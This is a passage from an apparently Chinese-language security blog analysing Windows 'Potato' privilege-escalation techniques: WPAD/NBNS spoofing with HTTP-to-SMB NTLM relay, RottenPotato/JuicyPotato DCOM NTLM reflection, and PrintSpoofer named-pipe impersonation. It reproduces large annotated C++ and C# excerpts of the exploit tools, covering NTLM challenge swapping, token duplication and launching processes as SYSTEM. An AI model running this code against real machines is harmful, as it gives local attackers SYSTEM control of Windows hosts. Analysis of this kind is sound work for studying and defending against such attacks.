lookup查询（本地dns缓存，远程dns）3、nbns请求如下当访问一个不存在的域名时候，windows将触发nbns进行请求查询，请求的地址是255，此处是一个广播包，任何人都可以进行回复<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Aboutpotato/image-20211110141342310.png" alt="image-20211110141342310"></p><h4 id="wpad代理"><a href="#wpad代理" class="headerlink" title="wpad代理"></a>wpad代理</h4><pre class="line-numbers language-none"><code class="language-none">web proxy autodiscovery protocol 是web代理自动发现协议的简称，功能是可以使局域网中用户的浏览器自动发现内网中的代理服务器，并使用已发现的代理服务器连接互联网或者企业内网，支持所有主流浏览器，从ie5开始就已经支持了代理服务器自动发现切换的功能当系统开启了代理自动发现功能后，用户浏览器上网时候浏览器会在当前局域网中自动查找代理服务器，如果找到了代理服务器，则会从代理服务器上下载一个PAC配置文件，文件中定义了用户在访问一个URL时所使用的代理服务器，浏览器会下载并解析该文件，将相应的代理服务器设置到用户的浏览器中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="smb-relay"><a href="#smb-relay" class="headerlink" title="smb relay"></a>smb relay</h4><pre class="line-numbers language-none"><code class="language-none">让受害者尝试使用带有ntlm身份验证的smb协议相向攻击者进行身份验证，然后攻击者会将这些凭证中继回受害者的计算机，并且使用类似psexec的技术获得远程访问权限此处smb-&gt;smb relay已经不再能成功，但是利用跨协议攻击，http-&gt;smb relay依旧可以成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="实际攻击"><a href="#实际攻击" class="headerlink" title="实际攻击"></a>实际攻击</h3><pre class="line-numbers language-none"><code class="language-none">ie检测ie代理配置时候，方式是访问http:&#x2F;&#x2F;wpad&#x2F;wpad.dat其中wpad不一定存在于网络内，因为即使有dns服务器也没有必要解析wpad，除非网络想通过配置脚本自动配置网络中的代理信息在hosts、dns查询都不能获取wpad的情况下，系统必然使用nbns进行名字查询，此时可以通过nbns欺骗告知自己就是wpad可以伪造http服务，响应http的http:&#x2F;&#x2F;wpad&#x2F;wpad.dat请求通过在本地构造http，将wpad的流量全部引导本地127.0.0.1，即使低权限用户发出对wpad的nbns欺骗，高权限也会受到影响，认为wpad就是欺骗后的结果，包括本地管理员和system进程本地http服务器收到请求时，将会响应如下内容FindProxyForURL(url,host)&#123;if (dnsDomainIs(host, &quot;localhost&quot;)) return &quot;DIRECT&quot;;return &quot;PROXY 127.0.0.1:80&quot;;&#125;这也就导致了所有http流量都将在本地运行的服务器上进行重定向，因为能够控制http流量到我们控制的目标，那么可以尝试重定向到请求ntlm身份验证的地方，所有的http请求都重定向http:&#x2F;&#x2F;localhost&#x2F;GETHASHESxxxxx，请求http:&#x2F;&#x2F;localhost&#x2F;GETHASHESxxxxx，ntlm身份验证的401将请求响应，然后将任何ntlm凭据中继到本地smb并创建运行用户定义的服务，当有请求来自高权限账户，如，来自更新服务时候，将以system权限运行利用步骤1、nbns欺骗2、构造本地http从而响应wpad3、http-&gt;smb relay4、等待高权限进程的访问，激活更新服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Aboutpotato/image-20211110142207076.png" alt="image-20211110142207076"></p><pre class="line-numbers language-none"><code class="language-none">注意，因为windows设置代理和wpad文件的方式不同，有时不会那么的稳定，当漏洞利用不成功时，需要让他运行并等待，当有缓存条目的wpad时，或者没有找到wpad而允许直接访问internet时，会需要30-60分钟来刷新wpad文件，此时需要再次运行exp进行出发<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="RottenPotato-amp-JuicyPotato"><a href="#RottenPotato-amp-JuicyPotato" class="headerlink" title="RottenPotato &amp; JuicyPotato"></a>RottenPotato &amp; JuicyPotato</h2><h3 id="基本介绍-2"><a href="#基本介绍-2" class="headerlink" title="基本介绍"></a>基本介绍</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Aboutpotato/image-20211112090901319.png" alt="image-20211112090901319"></p><pre class="line-numbers language-none"><code class="language-none">通过 DCOM CALL 来使服务向攻击者监听的端口发起连接并进行 NTLM 认证，rotten和juicy是相似的原理，后者在前者的基础上更加完善补充使用 DCOM 时，如果以服务的方式远程连接，那么权限为 System，例如 BITS 服务使用 DCOM 可以通过 TCP 连接到本机的一个端口，发起 NTLM 认证，该认证可以被重放LocalService 用户默认具有 SeImpersonate 和 SeAssignPrimaryToken 权限实现攻击流程1、加载com，发出请求，权限为sytem，在指定的ip和端口位置尝试加载一个com对象此处使用的com对象为bits，CLSID为&#123;4991d34b-80a1-4291-83b6-3328366b9097&#125;可提供的com对象不唯一2、回应第一步的请求，发起ntlm认证，正常情况下由于权限不足，当前不是sytem所以无法认证成功3、针对本地端口，同样发起ntlm认证，权限为当前期用户，此处使用的是135，juicy支持指定任意本地端口4、分别拦截两个ntlm认证数据包，替换数据，通过ntlm重放使得第一步system的ntlm认证通过，获得system权限的token，需要修改ntlm的challenge5、使用system权限创建新的进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="实际攻击-1"><a href="#实际攻击-1" class="headerlink" title="实际攻击"></a>实际攻击</h3><pre class="line-numbers language-none"><code class="language-none">当前权限如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Aboutpotato/image-20211111133931348.png" alt="image-20211111133931348"></p><pre class="line-numbers language-none"><code class="language-none">提权后效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Aboutpotato/image-20211111151225826.png" alt="image-20211111151225826"></p><pre class="line-numbers language-none"><code class="language-none">此处clsid可使用如下脚本进行遍历<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Aboutpotato/image-20211111155840570.png" alt="image-20211111155840570"></p><pre class="line-numbers language-none"><code class="language-none">代码中CoGetInstanceFromIStorage，连接com调用一个bits对象实例，并且从127.0.0.1的6666进行加载        public static void BootstrapComMarshal()        &#123;            IStorage stg &#x3D; CreateStorage();                        Guid clsid &#x3D; new Guid(&quot;4991d34b-80a1-4291-83b6-3328366b9097&quot;);            TestClass c &#x3D; new TestClass(stg);            MULTI_QI[] qis &#x3D; new MULTI_QI[1];            qis[0].pIID &#x3D; GuidToPointer(&quot;00000000-0000-0000-C000-000000000046&quot;);            qis[0].pItf &#x3D; null;            qis[0].hr &#x3D; 0;            CoGetInstanceFromIStorage(null, ref clsid, null, CLSCTX.CLSCTX_LOCAL_SERVER, c, 1, qis);        &#125;com将运行system账户尝试进行ntlm身份验证，要做的就是本地6666监听com接收到的数据包中继回135的rpc监听查看第一阶段数据包<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Aboutpotato/image-20211111141808593.png" alt="image-20211111141808593"></p><pre class="line-numbers language-none"><code class="language-none">如下从6666端口进行监听域com的会话，然后将相同的数据包中继到rpc上，再从rpc上收到回复，再回复给com，攻击过程中只需要重复这个过程，知道ntlm认证<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Aboutpotato/image-20211111142017866.png" alt="image-20211111142017866"></p><pre class="line-numbers language-none"><code class="language-none">再看ntlm中继和本地令牌协商左边的com将在6666上发送数据包，右边的则是通过数据包内容对数据进行提取，进步开展api调用为了使用ntlm身份验证在看本地协商安全令牌，必须调用函数AcquireCredentialsHandle来获取数据结构进步再调用AcceptSecurityContext，输入ntlm协商消息，输出challenge，消息将被发送返回身份验证，此处为dcom当ntlm身份验证消息响应时，在传递给对AcceptSecurityContext的调用以完成身份验证过程并获取令牌<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Aboutpotato/image-20211111142330713.png" alt="image-20211111142330713"></p><pre class="line-numbers language-none"><code class="language-none">协商数据包，在rpc和com进行中继，最终com将尝试发送ntlm协商来进行ntlm身份认证，此处将转发给rpc，rpc将回复一个ntlm询问<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Aboutpotato/image-20211111143014943.png" alt="image-20211111143014943"></p><pre class="line-numbers language-none"><code class="language-none">从com收到ntlm协商消息时，并使用他进行本地协商令牌过程<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Aboutpotato/image-20211111144301550.png" alt="image-20211111144301550"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Aboutpotato/image-20211111144031586.png" alt="image-20211111144031586"></p><pre class="line-numbers language-none"><code class="language-none">挑战类型数据包，将ntlm协商数据包转发到rpc上，然后rcp回复挑战数据包，查看两个挑战数据包，两个challenge并不相同，如果仅3是将数据包从rpc转发到com就不会这样<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Aboutpotato/image-20211111144425589.png" alt="image-20211111144425589"></p><pre class="line-numbers language-none"><code class="language-none">再回到AcceptSecurityContext进行api调用时，输出是一条challenge消息，所做的是利用api结果替换我们发送到com的数据包信息因为需要com，以system账户运行以操作ntlm质询和用来协商本地令牌保留部分进行身份验证，如果没有替换数据包中这一部分，对AcceptSecurityContext的操作将失败ntlm身份验证数据包目前将修改后他ntlm协商数据包转发到com中，其中的Challenge、Reserved同AcceptSecurityContext输出相匹配，当system收到ntlm上个阶段消息时，会在内存中进行幕后验证，这就是为什么要更新保留字段的原因完成后代表system账户的com将返回发送的身份验证数据包，这里应该是空的，因为是在内存中校验的，然后来进行AcceptSecurityContext的最终调用利用最终的调用结果以获取模拟令牌<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Aboutpotato/image-20211111150449563.png" alt="image-20211111150449563"></p><pre class="line-numbers language-none"><code class="language-none">补充 模拟令牌的条件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Aboutpotato/image-20211111150739681.png" alt="image-20211111150739681"></p><pre class="line-numbers language-none"><code class="language-none">Juicy potato数据包，大致和rotten potato相似<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Aboutpotato/image-20211111162828125.png" alt="image-20211111162828125"></p><h3 id="工具实现分析"><a href="#工具实现分析" class="headerlink" title="工具实现分析"></a>工具实现分析</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">实现过程比较复制，中间涉及ntlm认证相关class PotatoAPI &#123;&#x2F;&#x2F;api定义private:BlockingQueue&lt;char*&gt;* comSendQ;BlockingQueue&lt;char*&gt;* rpcSendQ;static DWORD WINAPI staticStartRPCConnection(void * Param);static DWORD WINAPI staticStartCOMListener(void * Param);static int newConnection;int processNtlmBytes(char* bytes, int len);int findNTLMBytes(char * bytes, int len);public:PotatoAPI(void);int startRPCConnection(void);    DWORD startRPCConnectionThread();DWORD startCOMListenerThread();int startCOMListener(void);int triggerDCOM();LocalNegotiator *negotiator;SOCKET ListenSocket &#x3D; INVALID_SOCKET;SOCKET ClientSocket &#x3D; INVALID_SOCKET;SOCKET ConnectSocket &#x3D; INVALID_SOCKET;&#125;;  PotatoAPI* test &#x3D; new PotatoAPI();test-&gt;startCOMListenerThread();&#x2F;&#x2F;创建新的线程监听，处理ntlm认证过程if (clsid !&#x3D; NULL)olestr &#x3D; clsid;if (!TEST_mode)printf(&quot;Testing %S %S\n&quot;, olestr, g_port);test-&gt;startRPCConnectionThread();&#x2F;&#x2F;创建新的进程中继到rpctest-&gt;triggerDCOM();BOOL result &#x3D; false;if (!OpenProcessToken(GetCurrentProcess(),TOKEN_ALL_ACCESS, &amp;hToken))return 0;&#x2F;&#x2F;进程token获取&#x2F;&#x2F;enable privilegesEnablePriv(hToken, SE_IMPERSONATE_NAME);EnablePriv(hToken, SE_ASSIGNPRIMARYTOKEN_NAME);PTOKEN_TYPE ptg;DWORD dwl &#x3D; 0;HANDLE hProcessToken;OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS,&amp;hProcessToken);QuerySecurityContextToken(test-&gt;negotiator-&gt;phContext, &amp;elevated_token);&#x2F;&#x2F;accesstoken获取result &#x3D; DuplicateTokenEx(elevated_token,&#x2F;&#x2F;token复制TOKEN_ALL_ACCESS,NULL,SecurityImpersonation,TokenPrimary,&amp;duped_token);&#x2F;&#x2F;winsock，实现端口复用，select实现多路复用,接收到client后进行ntlm认证iResult &#x3D; WSAStartup(MAKEWORD(2, 2), &amp;wsaData);ZeroMemory(&amp;hints, sizeof(hints));hints.ai_family &#x3D; AF_INET;hints.ai_socktype &#x3D; SOCK_STREAM;hints.ai_protocol &#x3D; IPPROTO_TCP;hints.ai_flags &#x3D; AI_PASSIVE;memset(dcom_port, 0, 12);wcstombs(dcom_port, g_port, 12);&#x2F;&#x2F; printf(&quot;[+] Listening on port:%s\n&quot;, dcom_port);&#x2F;&#x2F; Resolve the server address and portiResult &#x3D; getaddrinfo(NULL, dcom_port, &amp;hints, &amp;result);&#x2F;&#x2F; Create a SOCKET for connecting to serverListenSocket &#x3D; socket(result-&gt;ai_family, result-&gt;ai_socktype, result-&gt;ai_protocol);int optval &#x3D; 1;setsockopt(ListenSocket, SOL_SOCKET, SO_REUSEADDR, (char *)&amp;optval, sizeof(optval));&#x2F;&#x2F; Setup the TCP listening socketiResult &#x3D; bind(ListenSocket, result-&gt;ai_addr, (int)result-&gt;ai_addrlen);&#x2F;&#x2F;printf(&quot;startCOMListener bindresult%d\n&quot;, iResult);if (iResult &#x3D;&#x3D; SOCKET_ERROR) &#123;freeaddrinfo(result);closesocket(ListenSocket);WSACleanup();return 1;&#125;freeaddrinfo(result);iResult &#x3D; listen(ListenSocket, SOMAXCONN);if (iResult &#x3D;&#x3D; SOCKET_ERROR) &#123;closesocket(ListenSocket);WSACleanup();return 1;&#125;&#x2F;&#x2F;---- non block socket servertimeval timeout &#x3D; &#123; 1, 0 &#125;;fd_set fds;FD_ZERO(&amp;fds);FD_SET(ListenSocket, &amp;fds);select(ListenSocket + 1, &amp;fds, NULL, NULL, &amp;timeout);if (FD_ISSET(ListenSocket, &amp;fds))&#123;ClientSocket &#x3D; accept(ListenSocket, NULL, NULL);if (ClientSocket &#x3D;&#x3D; INVALID_SOCKET) &#123;closesocket(ListenSocket);WSACleanup();return 1;&#125;&#125;iResult &#x3D; recv(ClientSocket, recvbuf, recvbuflen, 0);processNtlmBytes(recvbuf, iResult);&#x2F;&#x2F;循环ntlm认证流程查看接收到的ntlm认证包&#x2F;&#x2F;所有数据包发送到winrpc套接字的发送队列并等待winrpc套接字将数据包放入到发送队列内rpcSendQ-&gt;push((char*)&amp;iResult);rpcSendQ-&gt;push(recvbuf);&#x2F;&#x2F;检查是否包含ntlm认证信息，并发送新的信息processNtlmBytes(sendbuf, *len);iSendResult &#x3D; send(ClientSocket, sendbuf, *len, 0);&#x2F;&#x2F;创建个socket并连接ConnectSocket &#x3D; socket(ptr-&gt;ai_family, ptr-&gt;ai_socktype, ptr-&gt;ai_protocol);if (ConnectSocket &#x3D;&#x3D; INVALID_SOCKET) &#123;printf(&quot;socket failed with error: %ld\n&quot;, WSAGetLastError());WSACleanup();return 1;&#125;iResult &#x3D; connect(ConnectSocket, ptr-&gt;ai_addr, (int)ptr-&gt;ai_addrlen);if (iResult &#x3D;&#x3D; SOCKET_ERROR) &#123;closesocket(ConnectSocket);ConnectSocket &#x3D; INVALID_SOCKET;continue;&#x2F;&#x2F;中继转发    int *len &#x3D; (int*)rpcSendQ-&gt;wait_pop();fflush(stdout);sendbuf &#x3D; rpcSendQ-&gt;wait_pop();iResult &#x3D; send(ConnectSocket, sendbuf, *len, 0);iResult &#x3D; recv(ConnectSocket, recvbuf, recvbuflen, 0);&#x2F;&#x2F;后面主要是ntlm的协商过程 AcquireCredentialsHandle获取security principal中预先存在的凭据句柄，InitializeSecurityContext和AcceptSecurityContext需要此句柄    int status &#x3D; AcquireCredentialsHandle(NULL,lpPackageName,SECPKG_CRED_INBOUND,NULL,NULL,0,NULL,&amp;hCred,&amp;ptsExpiry);  第一次调用成功将返回SEC_I_CONTINUE_NEEDED  InitTokenContextBuffer(&amp;secClientBufferDesc, &amp;secClientBuffer);InitTokenContextBuffer(&amp;secServerBufferDesc, &amp;secServerBuffer);phContext &#x3D; new CtxtHandle();secClientBuffer.cbBuffer &#x3D; static_cast&lt;unsigned long&gt;(len);secClientBuffer.pvBuffer &#x3D; ntlmBytes;ULONG fContextAttr;TimeStamp tsContextExpiry;status &#x3D; AcceptSecurityContext(&amp;hCred,nullptr,&amp;secClientBufferDesc,ASC_REQ_ALLOCATE_MEMORY | ASC_REQ_CONNECTION,&#x2F;&#x2F;STANDARD_CONTEXT_ATTRIBUTES,SECURITY_NATIVE_DREP,phContext,&amp;secServerBufferDesc,&amp;fContextAttr,&amp;tsContextExpiry);  &#x2F;&#x2F;处理rpc发来的ntlm type2，将响应修改为AcceptSecurityContext本地协商返回的type2即修改server challenge和reserved      char* newNtlmBytes &#x3D; (char*)secServerBuffer.pvBuffer;if (len &gt;&#x3D; secServerBuffer.cbBuffer) &#123;for (int i &#x3D; 0; i &lt; len; i++)&#123;if (i &lt; secServerBuffer.cbBuffer) &#123;ntlmBytes[i] &#x3D; newNtlmBytes[i];&#125;else &#123;ntlmBytes[i] &#x3D; 0x00;&#125;&#125;&#125;  &#x2F;&#x2F;第二次调用AcceptSecurityContext，输入ntlm type3  int status &#x3D; AcceptSecurityContext(&amp;hCred,phContext,&amp;secClientBufferDesc,ASC_REQ_ALLOCATE_MEMORY | ASC_REQ_CONNECTION,&#x2F;&#x2F;STANDARD_CONTEXT_ATTRIBUTES,SECURITY_NATIVE_DREP,phContext,&amp;secServerBufferDesc,&amp;fContextAttr,&amp;tsContextExpiry);&#x2F;&#x2F;至此协商过程结束        后面基本就是模拟令牌，然后CreateProcessASUser、CreateProcessWithToken创建进程      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="PrintSpoofer-or-PipePotato-or-BadPotato"><a href="#PrintSpoofer-or-PipePotato-or-BadPotato" class="headerlink" title="PrintSpoofer or PipePotato or BadPotato"></a>PrintSpoofer or PipePotato or BadPotato</h2><h3 id="基本介绍-3"><a href="#基本介绍-3" class="headerlink" title="基本介绍"></a>基本介绍</h3><pre class="line-numbers language-none"><code class="language-none">核心原理是利用了打印机错误漏洞，其中通过调用api ImpersonateNamedPipeClient来模拟高权限客户端的token（还有类似的ImpersonatedLoggedOnUser，RpcImpersonateClient函数），调用函数后会改变当前线程的安全上下文，结合打印机检查路径的漏洞，使得system权限服务能够连接到攻击者创建的named pipespoolsv.exe服务中有一个公开的rpc服务，包含函数如下函数将调用创建一个远程更改通知对象，该对象监视对打印机的更改，并将更改通知发送到打印机客户端DWORD RpcRemoteFindFirstPrinterChangeNotificationEx(     &#x2F;* [in] *&#x2F; PRINTER_HANDLE hPrinter,    &#x2F;* [in] *&#x2F; DWORD fdwFlags,    &#x2F;* [in] *&#x2F; DWORD fdwOptions,    &#x2F;* [unique][string][in] *&#x2F; wchar_t *pszLocalMachine, &#x2F;&#x2F;传递unc路径，传递\\127.0.0.1将访问到\pipe\spoolss，因为这个管道已经被系统注册，所以传递时候，会因为路径检查二报错 StringCchPrintf(pwszPipeFullname, MAX_PATH, L&quot;\\\\.\\pipe\\%ws\\pipe\\spoolss&quot;, pwszPipeName);    &#x2F;* [in] *&#x2F; DWORD dwPrinterLocal,    &#x2F;* [unique][in] *&#x2F; RPC_V2_NOTIFY_OPTIONS *pOptions)服务&amp;管道情况如下：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Aboutpotato/image-20211112103404361.png" alt="image-20211112103404361"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Aboutpotato/image-20211112103455688.png" alt="image-20211112103455688"></p><pre class="line-numbers language-none"><code class="language-none">细谈unc路径报错信息，默认如果server_name是\\127.0.0.1，系统用户会访问\\127.0.0.1\pipe\spoolss，但如果主机名包含&#x2F;，他讲通过路径验证检查，但是在计算要连接的命名管道路径时，规范会将其转化为\，并且系统还将其认为是ipc连接的方式去发送服务通知所以作者的思路就能理解了，将接受的主机名设置为\\localhost&#x2F;pipe&#x2F;crispr，因为路径规范问题打印机会无人为\\localhost\pipe\crispr\pipe\spoolss，和默认的\\.\pipe\spoolss不是同个管道，因此可以通过创建\\localhost\pipe\crispr\pipe\spoolss来等待SYSTEM权限的spoolsv进程来连接管道<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="实现攻击"><a href="#实现攻击" class="headerlink" title="实现攻击"></a>实现攻击</h3><pre class="line-numbers language-none"><code class="language-none">利用效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Aboutpotato/image-20211111175601816.png" alt="image-20211111175601816"></p><h3 id="工具实现分析-1"><a href="#工具实现分析-1" class="headerlink" title="工具实现分析"></a>工具实现分析</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Aboutpotato/image-20211111174653556.png" alt="image-20211111174653556"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Aboutpotato/image-20211111174736439.png" alt="image-20211111174736439"></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">if (!CheckAndEnablePrivilege(NULL, SE_IMPERSONATE_NAME))&#x2F;&#x2F;检测权限SeImpersonate并enable&#123;wprintf(L&quot;[-] A privilege is missing: &#39;%ws&#39;\n&quot;, SE_IMPERSONATE_NAME);goto cleanup;&#125;wprintf(L&quot;[+] Found privilege: %ws\n&quot;, SE_IMPERSONATE_NAME);if (!GenerateRandomPipeName(&amp;pwszPipeName))&#x2F;&#x2F;生成随机的管道名&#123;wprintf(L&quot;[-] Failed to generate a name for the pipe.\n&quot;);goto cleanup;&#125;if (!(hSpoolPipe &#x3D; CreateSpoolNamedPipe(pwszPipeName)))&#x2F;&#x2F;创建管道，此处允许任何客户端访问  &#123;wprintf(L&quot;[-] Failed to create a named pipe.\n&quot;);goto cleanup;&#125;if (!(hSpoolPipeEvent &#x3D; ConnectSpoolNamedPipe(hSpoolPipe)))&#x2F;&#x2F;等待连接，创建event并返回&#123;wprintf(L&quot;[-] Failed to connect the named pipe.\n&quot;);goto cleanup;&#125;wprintf(L&quot;[+] Named pipe listening...\n&quot;);if (!(hSpoolTriggerThread &#x3D; TriggerNamedPipeConnection(pwszPipeName)))&#x2F;&#x2F;创建新的线程 RpcOpenPrinter 返回命名管道&#123;wprintf(L&quot;[-] Failed to trigger the Spooler service.\n&quot;);goto cleanup;&#125;dwWait &#x3D; WaitForSingleObject(hSpoolPipeEvent, 5000);&#x2F;&#x2F;等待连接if (dwWait !&#x3D; WAIT_OBJECT_0)&#123;wprintf(L&quot;[-] Operation failed or timed out.\n&quot;);goto cleanup;&#125;GetSystem(hSpoolPipe);&#x2F;&#x2F;CreateProcessAsUser提权StringCchPrintf(pwszPipeFullname, MAX_PATH, L&quot;\\\\.\\pipe\\%ws\\pipe\\spoolss&quot;, pwszPipeName);&#x2F;&#x2F;管道名hPipe &#x3D; CreateNamedPipe(pwszPipeFullname, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &amp;sa);  &#x2F;&#x2F;FILE_FLAG_OVERLAPPED实现异步I&#x2F;O操作hThread &#x3D; CreateThread(NULL, 0, TriggerNamedPipeConnectionThread, pwszPipeName, 0, &amp;dwThreadId);&#x2F;&#x2F;利用TriggerNamedPipeConnection创建新的线程 TriggerNamedPipeConnectionThread连接命名管道   StringCchPrintf(pwszTargetServer, MAX_PATH, L&quot;\\\\%ws&quot;, pwszComputerName);StringCchPrintf(pwszCaptureServer, MAX_PATH, L&quot;\\\\%ws&#x2F;pipe&#x2F;%ws&quot;, pwszComputerName, pwszPipeName);RpcTryExcept&#123;if (RpcOpenPrinter(pwszTargetServer, &amp;hPrinter, NULL, &amp;devmodeContainer, 0) &#x3D;&#x3D; RPC_S_OK)&#123;RpcRemoteFindFirstPrinterChangeNotificationEx(hPrinter, PRINTER_CHANGE_ADD_JOB, 0, pwszCaptureServer, 0, NULL);RpcClosePrinter(&amp;hPrinter);&#125;&#125;RpcExcept(EXCEPTION_EXECUTE_HANDLER);&#123;&#x2F;&#x2F; Expect RPC_S_SERVER_UNAVAILABLE&#125;RpcEndExcept;进步调用BOOL GetSystem(HANDLE hPipe)if (!ImpersonateNamedPipeClient(hPipe)) &#x2F;&#x2F;ImpersonateNamedPipeClient 当前线程安全上下文切换为client的    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &amp;hSystemToken))&#x2F;&#x2F;获取令牌  if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &amp;hSystemTokenDup))&#x2F;&#x2F;复制新的令牌，DuplicateTokenEx创建一个primary令牌，DuplicateToken只能创建impersonation令牌，且给予 allaccessif (g_dwSessionId)&#123;if (!SetTokenInformation(hSystemTokenDup, TokenSessionId, &amp;g_dwSessionId, sizeof(DWORD)))&#x2F;&#x2F;通过cli传递sessionid，指定session中开启新的进程&#123;wprintf(L&quot;SetTokenInformation() failed. Error: %d\n&quot;, GetLastError());goto cleanup;&#125;&#125;  CreateProcessAsUser、CreateProcessWithTokenW提权同先前的管道实现相仿if (!CreateProcessAsUser(hSystemTokenDup, NULL, g_pwszCommandLine, NULL, NULL, g_bInteractWithConsole, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &amp;si, &amp;pi))&#123;if (GetLastError() &#x3D;&#x3D; ERROR_PRIVILEGE_NOT_HELD)&#123;wprintf(L&quot;[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().\n&quot;);RevertToSelf();if (!g_bInteractWithConsole)&#123;if (!CreateProcessWithTokenW(hSystemTokenDup, LOGON_WITH_PROFILE, NULL, g_pwszCommandLine, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &amp;si, &amp;pi))&#123;wprintf(L&quot;CreateProcessWithTokenW() failed. Error: %d\n&quot;, GetLastError());goto cleanup;&#125;else&#123;wprintf(L&quot;[+] CreateProcessWithTokenW() OK\n&quot;);&#125;&#125;else&#123;wprintf(L&quot;[!] CreateProcessWithTokenW() 